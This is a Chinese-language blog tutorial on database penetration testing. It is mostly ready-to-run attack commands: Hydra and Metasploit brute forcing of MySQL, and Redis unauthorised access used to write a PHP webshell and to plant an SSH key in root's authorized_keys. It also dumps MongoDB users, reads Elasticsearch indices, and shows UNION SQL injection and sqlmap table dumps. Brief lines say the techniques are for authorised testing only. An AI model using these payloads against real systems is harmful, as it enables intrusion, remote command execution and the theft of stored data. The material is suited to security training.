---
title: 数据库渗透测试：从口令爆破到数据脱库
slug: kali-4数据库渗透测试-2b3c4
date: 2026-09-12
visibility: public
tags: Kali Linux, 数据库安全, MySQL, Redis, MongoDB, 渗透测试, 脱库, 教程
---

# 数据库渗透测试：从口令爆破到数据脱库

> 数据库是企业最值钱的家底，也是攻击者最想拿的目标。本文覆盖 MySQL、Redis、MongoDB 等主流数据库的渗透思路：口令爆破、未授权访问、SQL 脱库、getshell。

## 一、数据库攻击面

```
攻击面
├─ 口令爆破（弱密码）
├─ 未授权访问（端口裸奔）
├─ SQL 注入（Web 层进入）
├─ 漏洞利用（CVE）
├─ 错误配置（公网暴露）
```

## 二、口令爆破

```bash
# MySQL 爆破
hydra -l root -P passwords.txt mysql://target

# SSH + 数据库联合
# MSF 内置爆破模块
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

> 常见弱口令：root/root、root/123456、admin/admin、空口令。

## 三、未授权访问

### Redis（6379）

```bash
# 直接连接（无密码 = 未授权）
redis-cli -h target -p 6379
> info          # 看版本
> keys *        # 看数据
```

### Redis 写 WebShell / 计划任务（经典）

```bash
# 利用 config set 写文件（未授权时）
redis-cli -h target
> config set dir /var/www/html/
> config set dbfilename shell.php
> set x "<?php system($_GET['c']);?>"
> save
# 访问 http://target/shell.php?c=id
```

### MongoDB（27017）

```bash
mongo mongodb://target:27017
show dbs
use admin
db.system.users.find()
```

### Elasticsearch（9200）

```bash
curl http://target:9200/_cat/indices
curl http://target:9200/_all/_search?size=1
```

## 四、SQL 注入拿数据

### 手工注入

```bash
# 判断注入点
?id=1' -- -
# 爆库名
?id=1' UNION SELECT database(),2 -- -
# 爆表名
?id=1' UNION SELECT table_name,2 FROM information_schema.tables -- -
# 爆数据
?id=1' UNION SELECT username,password FROM users -- -
```

### sqlmap 自动化

```bash
# 注入点检测
sqlmap -u "http://target/index.php?id=1"

# 脱库
sqlmap -u "http://target/index.php?id=1" --dbs
sqlmap -u "http://target/index.php?id=1" -D target_db --tables
sqlmap -u "http://target/index.php?id=1" -D target_db -T users --dump
```

## 五、数据库漏洞利用

### Redis 未授权 + 反弹 Shell

```bash
# 写入 SSH 公钥
ssh-keygen -t rsa
redis-cli -h target
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\n<公钥内容>\n\n"
> save
# 之后用私钥直接 SSH 登录
```

### MySQL UDF 提权

```bash
# 前提：有 MySQL 写文件权限
# 写入 UDF 动态库 → 创建自定义函数 → 执行系统命令
```

## 六、数据泄露后的处置

```
1. 确认数据规模与敏感性
2. 优先记录证据（截图/哈希）
3. 尽快报告（授权测试中）
4. 绝不私下扩散、倒卖数据（违法红线）
```

## 七、Kali 数据库工具

| 工具 | 用途 |
|------|------|
| sqlmap | SQL 注入自动化 |
| hydra | 口令爆破 |
| redis-cli | Redis 操作 |
| mongo | MongoDB 客户端 |
| metasploit | 爆破模块 |
| rdesktop | 远程桌面 |

## 安全合规

> 数据库渗透只能在授权环境进行。未经授权访问/拖取他人数据库数据属刑事犯罪（刑法第 285/286 条）。

## 小结

- 弱口令与未授权访问是数据库第一大风险
- Redis 未授权可直达 getshell
- sqlmap 是脱库标配，但要注意脱敏
- 数据库数据 = 法律责任，测试必须守红线
- 公网暴露 + 无认证 = 最高危组合

> 下一篇：C2 框架实战——Cobalt Strike 与 Sliver 详解。